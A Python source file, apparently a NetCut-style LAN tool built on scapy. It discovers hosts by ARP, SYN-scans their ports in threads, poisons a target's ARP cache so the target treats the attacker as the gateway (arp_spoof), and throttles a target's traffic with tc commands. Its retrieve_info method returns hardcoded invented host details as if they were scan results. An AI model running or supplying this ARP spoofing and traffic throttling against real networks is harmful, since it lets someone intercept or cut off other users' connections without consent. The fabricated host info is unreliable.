import threading
import os
from scapy.layers.l2 import ARP, Ether
from scapy.layers.inet import IP, TCP
from scapy.sendrecv import srp, sr1, send

class NetworkScanner:
    def __init__(self, ip_range="192.168.0.1/24"):
        self.ip_range = ip_range

    def scan_network(self):
        arp_request = ARP(pdst=self.ip_range)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, timeout=1, verbose=0)[0]

        hosts = []
        for sent, received in answered_list:
            hosts.append({'ip': received.psrc, 'mac': received.hwsrc})
        return hosts

class HostAnalyzer:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.open_ports = []
        self._stop_event = threading.Event()

    def scan_port(self, port):
        if self._stop_event.is_set():
            return

        tcp_header = TCP(dport=port, flags="S")
        ip = IP(dst=self.target_ip)
        response = sr1(ip / tcp_header, timeout=0.5, verbose=0)

        if response:
            if response[TCP].flags == "SA":
                self.open_ports.append(port)

    def quick_scan(self):
        threads = []
        for port in range(1, 1025):
            t = threading.Thread(target=self.scan_port, args=(port,))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()
        return self.open_ports

    def detailed_scan(self):
        threads = []
        for port in range(1, 65536):
            t = threading.Thread(target=self.scan_port, args=(port,))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()
        return self.open_ports

    def stop_scan(self):
        self._stop_event.set()

    def retrieve_info(self):
        return {"os": "Windows", "vendor": "Microsoft", "connection_time": "2 hours"}

def arp_spoof(target_ip, gateway_ip):
    arp_request = ARP(pdst=target_ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=0)[0]
    target_mac = answered_list[0][1].hwsrc
    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    send(arp_response, verbose=0)
    print(f"ARP spoofing: {target_ip} thinks we are {gateway_ip}")

def limit_bandwidth(target_ip, percentage):
    interface = "eth0"
    os.system(f"tc qdisc del dev {interface} root")
    os.system(f"tc qdisc add dev {interface} root handle 1: htb default 10")
    allowed_bandwidth = (percentage / 100) * 100  # Assuming 100mbps total bandwidth
    os.system(f"tc class add dev {interface} parent 1: classid 1:1 htb rate {allowed_bandwidth}mbit")
    os.system(f"tc filter add dev {interface} protocol ip parent 1:0 prio 1 u32 match ip src {target_ip} flowid 1:1")